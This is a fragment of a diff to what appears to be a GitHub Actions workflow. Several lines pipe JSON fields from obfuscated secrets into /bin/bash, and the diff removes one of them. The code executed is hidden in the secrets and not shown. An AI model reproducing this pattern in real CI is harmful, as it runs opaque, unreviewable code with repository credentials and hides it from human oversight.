@@ -20,7 +20,6 @@ jobs:
           i636: ${{ secrets.i636 }}
         run: |
           printf '%s' "$i636" | jq -r .zzmdc59423 | /bin/bash
-          echo $tzudy3 | jq -r .wxrev6258 | /bin/bash
           printf '%s' "$r5" | jq -r .ml1971 | /bin/bash
           printf '%s' "$gcg73" | jq -r .ar5 | /bin/bash
           printf '%s' "$phxl16064" | jq -r .l26727 | /bin/bash
